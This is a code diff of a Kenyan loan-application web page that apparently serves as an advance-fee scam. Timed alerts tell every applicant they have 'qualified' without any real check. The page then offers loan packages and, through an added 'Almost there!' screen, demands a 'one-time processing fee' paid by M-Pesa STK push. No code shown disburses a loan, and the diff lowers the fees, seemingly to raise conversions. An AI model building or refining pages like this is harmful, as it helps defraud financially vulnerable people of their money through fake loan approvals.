@@ -27,7 +27,7 @@
   <button class="btn btn-primary mt-3 px-4" onclick="startApplication()">Apply for a Loan</button>
 </div>
 
-<!-- Loan Application Form -->
+<!-- Application Form -->
 <div class="container py-4 d-none" id="applicationSection">
   <h3 class="text-center mb-4">Check Your Loan Eligibility</h3>
   <div class="card p-4 shadow-sm mx-auto" style="max-width: 500px;">
@@ -76,14 +76,24 @@
   </div>
 </div>
 
-<!-- Confirm Modal -->
+<!-- Loan Confirmation Screen -->
+<div class="container py-5 text-center d-none" id="loanConfirmation">
+  <div class="card p-4 shadow-sm mx-auto" style="max-width: 450px;">
+    <h5 class="mb-3 text-success">Almost there!</h5>
+    <p id="loanSummary" class="lead"></p>
+    <p>To receive this loan, please complete the one-time processing fee.</p>
+    <button class="btn btn-primary mt-3" onclick="confirmModal.show()">Pay Now</button>
+  </div>
+</div>
+
+<!-- Confirm Phone Modal -->
 <div class="modal fade" id="confirmModal" tabindex="-1">
   <div class="modal-dialog">
     <div class="modal-content">
       <form id="confirmForm">
         <div class="modal-header">
           <h5 class="modal-title">Confirm Your Phone Number</h5>
-          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+          <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
         </div>
         <div class="modal-body">
           <label for="confirmPhone" class="form-label">MPesa Phone Number</label>
@@ -97,16 +107,17 @@
   </div>
 </div>
 
-<!-- Bootstrap & Logic -->
+<!-- Scripts -->
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 <script>
   const landingPage = document.getElementById('landingPage');
   const applicationSection = document.getElementById('applicationSection');
-  const eligibilityForm = document.getElementById('eligibilityForm');
   const qualifiedMessage = document.getElementById('qualifiedMessage');
-  const optionsGrid = document.getElementById('optionsGrid');
   const loanOptions = document.getElementById('loanOptions');
+  const optionsGrid = document.getElementById('optionsGrid');
   const proceedBtn = document.getElementById('proceedBtn');
+  const loanConfirmation = document.getElementById('loanConfirmation');
+  const loanSummary = document.getElementById('loanSummary');
   const confirmModal = new bootstrap.Modal(document.getElementById('confirmModal'));
   const confirmPhone = document.getElementById('confirmPhone');
   const confirmForm = document.getElementById('confirmForm');
@@ -115,12 +126,12 @@
   let applicantPhone = '';
 
   const loanPackages = [
-    { amount: 5500, fee: 180 },
-    { amount: 7800, fee: 220 },
-    { amount: 9800, fee: 240 },
-    { amount: 11200, fee: 300 },
-    { amount: 16800, fee: 350 },
-    { amount: 21200, fee: 400 }
+    { amount: 5500, fee: 100 },
+    { amount: 7800, fee: 120 },
+    { amount: 9800, fee: 140 },
+    { amount: 11200, fee: 180 },
+    { amount: 16800, fee: 200 },
+    { amount: 21200, fee: 220 }
   ];
 
   function startApplication() {
@@ -130,7 +141,7 @@
     }, 300);
   }
 
-  eligibilityForm.onsubmit = function(e) {
+  document.getElementById('eligibilityForm').onsubmit = function (e) {
     e.preventDefault();
     applicantPhone = document.getElementById('phoneNumber').value;
     confirmPhone.value = applicantPhone;
@@ -138,10 +149,7 @@
     applicationSection.classList.add('d-none');
     qualifiedMessage.classList.remove('d-none');
 
-    setTimeout(() => {
-      alert("You have qualified for a loan! Choose your amount next.");
-    }, 1000);
-
+    setTimeout(() => alert("You have qualified for a loan! Choose your loan amount next."), 1000);
     setTimeout(() => {
       qualifiedMessage.classList.add('d-none');
       loanOptions.classList.remove('d-none');
@@ -163,7 +171,7 @@
     });
 
     document.querySelectorAll('.loan-card').forEach(card => {
-      card.onclick = function() {
+      card.onclick = function () {
         document.querySelectorAll('.loan-card').forEach(c => c.classList.remove('selected'));
         this.classList.add('selected');
         selectedOption = loanPackages[this.dataset.index];
@@ -173,10 +181,13 @@
   }
 
   proceedBtn.onclick = () => {
-    confirmModal.show();
+    loanOptions.classList.add('d-none');
+    loanConfirmation.classList.remove('d-none');
+    loanSummary.innerHTML = `You selected <strong>Ksh ${selectedOption.amount.toLocaleString()}</strong>.<br />
+      Processing fee is <strong>Ksh ${selectedOption.fee}</strong>.`;
   };
 
-  confirmForm.onsubmit = async function(e) {
+  confirmForm.onsubmit = async function (e) {
     e.preventDefault();
     const phone = confirmPhone.value.replace(/^0/, '254');
     const fee = selectedOption.fee;
@@ -185,7 +196,7 @@
     confirmForm.querySelector('button').disabled = true;
 
     try {
-      const response = await fetch("https://api.payhero.co.ke/stk-push", {
+      const res = await fetch("https://api.payhero.co.ke/stk-push", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -196,14 +207,14 @@
         })
       });
 
-      if (response.ok) {
-        alert("STK Push sent! Complete payment on your MPesa.");
+      if (res.ok) {
+        alert("STK Push sent! Complete the payment on your MPesa.");
         confirmModal.hide();
       } else {
-        alert("Failed to initiate STK Push. Try again.");
+        alert("Failed to send STK push. Try again.");
       }
     } catch (err) {
-      alert("Network error. Please check your internet.");
+      alert("Network error. Please try again.");
     }
 
     confirmForm.querySelector('button').innerHTML = 'Pay Processing Fee';
